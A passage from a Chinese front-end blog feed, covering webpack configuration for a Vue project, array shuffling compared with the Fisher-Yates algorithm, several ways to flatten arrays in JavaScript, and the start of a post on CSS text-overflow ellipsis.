&#123;</span><br><span class="line">        test: <span class="regexp">/\.(jpe?g|png|gif)$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'url-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              limit: <span class="number">4096</span>,</span><br><span class="line">              fallback: &#123;</span><br><span class="line">                loader: <span class="string">'file-loader'</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                  name: <span class="string">'img/[name].[hash:8].[ext]'</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(mp4|webm|ogg|mp3|wav|flac|aac)(\?.*)?$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'url-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              limit: <span class="number">4096</span>,</span><br><span class="line">              fallback: &#123;</span><br><span class="line">                loader: <span class="string">'file-loader'</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                  name: <span class="string">'media/[name].[hash:8].[ext]'</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(woff2?|eot|ttf|otf)(\?.*)?$/i</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'url-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              limit: <span class="number">4096</span>,</span><br><span class="line">              fallback: &#123;</span><br><span class="line">                loader: <span class="string">'file-loader'</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                  name: <span class="string">'fonts/[name].[hash:8].[ext]'</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> VueLoaderPlugin(),</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: path.resolve(__dirname, <span class="string">'../public/index.html'</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.NamedModulesPlugin(),</span><br><span class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-4-生产环境配置"><a href="#5-4-生产环境配置" class="headerlink" title="5.4 生产环境配置"></a>5.4 生产环境配置</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> webpackConfig = <span class="built_in">require</span>(<span class="string">'./webpack.config'</span>)</span><br><span class="line"><span class="keyword">const</span> MiniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">'mini-css-extract-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> OptimizeCssnanoPlugin = <span class="built_in">require</span>(<span class="string">'@intervolga/optimize-cssnano-plugin'</span>);</span><br><span class="line"><span class="keyword">const</span> CleanWebpackPlugin = <span class="built_in">require</span>(<span class="string">'clean-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> CopyWebpackPlugin = <span class="built_in">require</span>(<span class="string">'copy-webpack-plugin'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = merge(webpackConfig, &#123;</span><br><span class="line">  mode: <span class="string">'production'</span>,</span><br><span class="line">  devtool: <span class="string">'#source-map'</span>,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    splitChunks: &#123;</span><br><span class="line">      cacheGroups: &#123;</span><br><span class="line">        vendors: &#123;</span><br><span class="line">          name: <span class="string">'chunk-vendors'</span>,</span><br><span class="line">          test: <span class="regexp">/[\\\/]node_modules[\\\/]/</span>,</span><br><span class="line">          priority: <span class="number">-10</span>,</span><br><span class="line">          chunks: <span class="string">'initial'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        common: &#123;</span><br><span class="line">          name: <span class="string">'chunk-common'</span>,</span><br><span class="line">          minChunks: <span class="number">2</span>,</span><br><span class="line">          priority: <span class="number">-20</span>,</span><br><span class="line">          chunks: <span class="string">'initial'</span>,</span><br><span class="line">          reuseExistingChunk: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.(scss|sass)$/</span>,</span><br><span class="line">        use: [</span><br><span class="line">          &#123;</span><br><span class="line">            loader: MiniCssExtractPlugin.loader</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'css-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              importLoaders: <span class="number">2</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'sass-loader'</span>,</span><br><span class="line">            options: &#123;</span><br><span class="line">              implementation: <span class="built_in">require</span>(<span class="string">'dart-sass'</span>)</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: <span class="string">'postcss-loader'</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">'process.env'</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="string">'production'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">      filename: <span class="string">'css/[name].[contenthash:8].css'</span>,</span><br><span class="line">      chunkFilename: <span class="string">'css/[name].[contenthash:8].css'</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> OptimizeCssnanoPlugin(&#123;</span><br><span class="line">      sourceMap: <span class="literal">true</span>,</span><br><span class="line">      cssnanoOptions: &#123;</span><br><span class="line">        preset: [</span><br><span class="line">          <span class="string">'default'</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            mergeLonghand: <span class="literal">false</span>,</span><br><span class="line">            cssDeclarationSorter: <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> CopyWebpackPlugin([</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">from</span>: path.resolve(__dirname, <span class="string">'../public'</span>),</span><br><span class="line">        to: path.resolve(__dirname, <span class="string">'../dist'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    ]),</span><br><span class="line">    <span class="keyword">new</span> CleanWebpackPlugin()</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="5-5-修改package-json"><a href="#5-5-修改package-json" class="headerlink" title="5.5 修改package.json"></a>5.5 修改package.json</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">"scripts"</span>: &#123; </span><br><span class="line">  <span class="string">"serve"</span>: <span class="string">"webpack-dev-server --config ./build/webpack.dev.js"</span>,         <span class="string">"build"</span>: <span class="string">"webpack --config ./build/webpack.prod.js"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行npm run serve成功启动<br><img src="/images/cli3.png" alt="My Pic"><br>运行npm run build 打包成功<br><img src="/images/cli4.png" alt="My Pic"><br>参考博客：<a href="https://juejin.im/post/5cc55c336fb9a032086dd701" target="_blank" rel="noopener">面试官：自己搭建过vue开发环境吗？</a></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>数组乱序</title>
    <url>/2020/06/04/%E6%95%B0%E7%BB%84%E4%B9%B1%E5%BA%8F/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;之前在一些需求上有遇到过需要对数组进行乱序的操作，当时就直接使用sort + Math.random去实现的。后面在其他的文章中了解到这种方法并不能实现正真的乱序，而且有更好的方法去实现，就简单的总结一下。<br><a id="more"></a></p>
<h3 id="Math-random"><a href="#Math-random" class="headerlink" title="Math.random"></a>Math.random</h3><blockquote>
<p>这是最容易想到的一个方法</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> values = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">values.sort(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(values)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Math.random() - 0.5 随机得到一个正数、负数或是 0，如果是正数则降序排列，如果是负数则升序排列，如果是 0 就不变，然后不断的升序或者降序，最终得到一个乱序的数组。但是实际上是有问题的，我们可以写一个demo来测试一下。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> times = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    </span><br><span class="line">    arr.sort(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span>);</span><br><span class="line">    </span><br><span class="line">    times[arr[<span class="number">0</span>]<span class="number">-1</span>]++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(times)</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/sort.png" alt="Image"></p>
<blockquote>
<p>这个结果表示乱序之后第一个元素分别为1，2，3，4，5的次数。那究竟是什么原因导致的呢<br>这就要追溯到ECMA SCRIPT对各种浏览器实现sort的规定，大致说的意思是，我不管你排序的算法稳不稳定，反正你能给用户自定义排序规则就行，不给你就爱咋折腾咋折腾，导致各个浏览器实现的算法都不太相同</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">浏览器</th>
<th style="text-align:center">Chrome</th>
<th style="text-align:center">FireFox</th>
<th style="text-align:center">Safari</th>
<th style="text-align:center">Microsoft Edge/IE9+</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">实现</td>
<td style="text-align:center">核心是小于等于10的数组用插入排序（稳定），大于10的采用了quickSort（不稳定）</td>
<td style="text-align:center">采用了归并排序（稳定）</td>
<td style="text-align:center">如果没有自定义的排序规则传入，采用桶排序（不一定稳定， 桶排序的稳定性取决于桶内排序的稳定性, 因此其稳定性不确定。），传入自定义规则，采用归并排序（稳定）</td>
<td style="text-align:center">采用快排（不稳定）</td>
</tr>
</tbody>
</table>
<h3 id="洗牌算法"><a href="#洗牌算法" class="headerlink" title="洗牌算法"></a>洗牌算法</h3><blockquote>
<p>原理很简单，就是遍历数组元素，然后将当前元素与以后随机位置的元素进行交换。它也有两种实现，一种是原地的，还有一种是借助额外的变量。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = a.length; i; i--) &#123;</span><br><span class="line">        <span class="keyword">let</span> j = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * i);</span><br><span class="line">        [a[i - <span class="number">1</span>], a[j]] = [a[j], a[i - <span class="number">1</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shuffle</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = []</span><br><span class="line">  <span class="keyword">while</span> (arr.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> num = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * arr.length)</span><br><span class="line">    a.push(arr.splice(num, <span class="number">1</span>)[<span class="number">0</span>])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最后再测试一下</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> times = <span class="number">100000</span>;</span><br><span class="line"><span class="keyword">var</span> res = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = shuffle([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> key = <span class="built_in">JSON</span>.stringify(arr);</span><br><span class="line">    res[key] ? res[key]++ :  res[key] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(res)</span><br></pre></td></tr></table></figure>
<p><img src="/images/sort2.png" alt="Image"></p>
<blockquote>
<p>结果能看出来 已经实现了真正的乱序</p>
</blockquote>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>数组扁平化的实现</title>
    <url>/2019/12/28/%E6%95%B0%E7%BB%84%E6%89%81%E5%B9%B3%E5%8C%96%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;数组方法中的flat方法相信大家并不陌生，作用是将传入的数组进行扁平化处理。接收1个参数，扁平化处理的层数默认为1层，我们先来看看其具体效果吧：<br><a id="more"></a></p>
<h3 id="Array-prototype-flat"><a href="#Array-prototype-flat" class="headerlink" title="Array.prototype.flat"></a>Array.prototype.flat</h3><blockquote>
<p>Array.prototype.flat() 用于将嵌套的数组“拉平”，变成一维的数组。<br>该方法返回一个新数组，对原数据没有影响。不传参数时，默认“拉平”一层，可以传入一个整数，表示想要“拉平”的层数。<br>传入 &lt;=0 的整数将返回原数组，不“拉平”Infinity 关键字作为参数时，无论多少层嵌套，都会转为一维数组如果原数组有空位，Array.prototype.flat() 会跳过空位。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, [<span class="number">777</span>]]], [<span class="string">'hah'</span>, <span class="string">'xixi'</span>], &#123;<span class="attr">obj</span>: <span class="number">1</span>&#125;]</span><br><span class="line">  <span class="built_in">console</span>.log(arr.flat())</span><br><span class="line">  <span class="built_in">console</span>.log(arr.flat(<span class="literal">Infinity</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/images/flat1.png" alt="My Pic"></p>
<h3 id="Array-toString"><a href="#Array-toString" class="headerlink" title="Array.toString"></a>Array.toString</h3><blockquote>
<p>这是最粗暴的方法，对于只有基本类型的数组能够生效。但是一旦存在引用类型就会出现问题,对于普通对象来说，除非自定义，否则返回内部属性[[Class]]的值。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, [<span class="number">777</span>]]], [<span class="string">'hah'</span>, <span class="string">'xixi'</span>], &#123;<span class="attr">obj</span>: <span class="number">1</span>&#125;]</span><br><span class="line">  <span class="built_in">console</span>.log(arr.toString().split(<span class="string">','</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/images/flat2.png" alt="My Pic"></p>
<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><blockquote>
<ol>
<li>遍历数组（各种遍历方法）</li>
<li>判断元素是否为数组（Array.isArray、Object.prototype.toString、instance of）</li>
<li>将该数组元素展开（主要时使用concat方法用于合并两个或多个数组，在拼接的过程中加上扩展运算符会展开一层数组）</li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[].concat(...arr)</span><br><span class="line"></span><br><span class="line">[].concat.apply([], arr)</span><br></pre></td></tr></table></figure>
<h4 id="遍历-递归"><a href="#遍历-递归" class="headerlink" title="遍历+递归"></a>遍历+递归</h4><blockquote>
<p>根据上面的三个思路，很容易编写出下面的代码</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFlat</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arrResult = []</span><br><span class="line">    arr.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(item)) &#123;</span><br><span class="line">        arrResult = arrResult.concat(myFlat(item))</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        arrResult.push(item)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> arrResult</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在这个基础上，我们再把递归次数给加上</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFlat</span> (<span class="params">arr, num = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arrResult = []</span><br><span class="line">    <span class="keyword">if</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      arr.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(item)) &#123;</span><br><span class="line">          arrResult = arrResult.concat(myFlat(item, --num))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          arrResult.push(item)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">return</span> arrResult</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> arr</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/flat3.png" alt="My Pic"></p>
<h4 id="Reduce-递归"><a href="#Reduce-递归" class="headerlink" title="Reduce + 递归"></a>Reduce + 递归</h4><blockquote>
<p>利用reduce遍历 在加上concat就可以很容易的将数组展开</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr.reduce(<span class="function">(<span class="params">pre, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> pre.concat(next)</span><br><span class="line">&#125;, [])</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据上面的这种方法，我们也很容易的写出其具体实现</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myflat2 = <span class="function">(<span class="params">arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> arr.reduce(<span class="function">(<span class="params">pre, next</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> pre.concat(<span class="built_in">Array</span>.isArray(next) ? myflat2(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 再加上递归层数</span></span><br><span class="line">  <span class="keyword">let</span> myflat2 = <span class="function">(<span class="params">arr, num = <span class="number">1</span></span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> num &gt; <span class="number">0</span> ? arr.reduce(<span class="function">(<span class="params">pre, next</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> pre.concat(<span class="built_in">Array</span>.isArray(next) ? myflat2(next, --num) : next)</span><br><span class="line">    &#125;, []) : arr</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">console</span>.log(myflat2(arr))</span><br><span class="line"><span class="built_in">console</span>.log(myflat2(arr, <span class="literal">Infinity</span>))</span><br></pre></td></tr></table></figure>
<p><img src="/images/flat4.png" alt="My Pic"></p>
<h4 id="栈结构来实现"><a href="#栈结构来实现" class="headerlink" title="栈结构来实现"></a>栈结构来实现</h4><blockquote>
<p>主要是利用栈先进后出的结构，不断pop出栈顶元素，判断其是否为数组，如果是的话将数组展开之后，再次push入栈。如果不是则取出来放入结果中的最前面<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFlat3</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = []</span><br><span class="line">    <span class="keyword">let</span> tempArr = [].concat(arr)</span><br><span class="line">    <span class="keyword">while</span>(tempArr.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> val = tempArr.pop()</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(val)) &#123;</span><br><span class="line">        tempArr.push(...val)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result.unshift(val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(myFlat3(arr))</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/flat5.png" alt="My Pic"></p>
<h4 id="Generator来实现"><a href="#Generator来实现" class="headerlink" title="Generator来实现"></a>Generator来实现</h4><blockquote>
<p>调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象。<br>也就是遍历器对象（Iterator Object）。所以我们要用一次扩展运算符得到结果</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">myFlat4</span> (<span class="params">arr, num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num === <span class="literal">undefined</span>) num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">of</span> arr) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(i) &amp;&amp; num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">yield</span>* myFlat4(i, --num)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">console</span>.log([...myFlat4(arr, <span class="number">1</span>)])</span><br></pre></td></tr></table></figure>
<p><img src="/images/flat6.png" alt="My Pic"></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>文本溢出截断省略的方法合集</title>
    <url>/2019/11/11/%E6%96%87%E6%9C%AC%E6%BA%A2%E5%87%BA%E6%88%AA%E6%96%AD%E7%9C%81%E7%95%A5%E7%9A%84%E6%96%B9%E6%B3%95%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;相信关于对文本截断溢出的处理，大家在工作和平时的练习中应该遇到过很多很多了，每个人也有自己最熟悉和常用的解决方法，最近看到了一篇关于这个内容的blog，才发现原来还有这些方法，于是自己也想总结一下，下面就是对于文本溢出截断省略的比较全的解决方法：<br><a id="more"></a></p>
<h3 id="单行文本溢出省略号"><a href="#单行文本溢出省略号" class="headerlink" title="单行文本溢出省略号"></a>单行文本溢出省略号</h3><blockquote>
<p>这种类型是大家遇到最多的，同时其实现也是大家最熟悉的。主要是利用的css中的几个属性overflow、white-space、text-overflow。</p>
</blockquote>
<h4 id="核心的代码"><a href="#核心的代码" class="headerlink" title="核心的代码"></a>核心的代码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文本换行处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  div&#123;</span></span><br><span class="line"><span class="undefined">    position: relative;</span></span><br><span class="line"><span class="undefined">    overflow: hidden;</span></span><br><span class="line"><span class="undefined">    text-overflow: ellipsis;</span></span><br><span class="line"><span class="undefined">    white-space: nowrap;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>ajhsfjhasgjkasakjsbhakjsghasghasghkjasghasgjashkghaskjhasjgaskghaghashgaslkghasglhkasjhgakshlgajskghkjashgjasghasjhgsahlgashglasghashagh<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/break1.gif" alt="My Pic"></p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>没有兼容问题</li>
<li>会根据浏览器窗口的伸缩而变化</li>
<li>由于使用属性实现截断的位置刚好</li>
</ul>
<h4 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h4><blockquote>
<p>其实只是对于单行的需求，这个已经能够比较好的实现了。但是奈何需求是会变化的，当想要实现多行文本溢出省略号时，这个方法就不行了</p>
</blockquote>
<h3 id="多行文本溢出省略"><a href="#多行文本溢出省略" class="headerlink" title="多行文本溢出省略"></a>多行文本溢出省略</h3><blockquote>
<p>这个需求也可以通过纯css来实现，但是里面有些属性的兼容性不是很好，主要使用一下几个属性：<br>-webkit-line-clamp（用来限制在一个块元素显示的文本的行数）<br>display: -webkit-box；（将对象作为弹性伸缩盒子模型显示 ）<br>-webkit-box-orient: vertical;（设置或检索伸缩盒对象的子元素的排列方式 ）<br>overflow:hidden + text-overflow:ellipsis</p>
</blockquote>
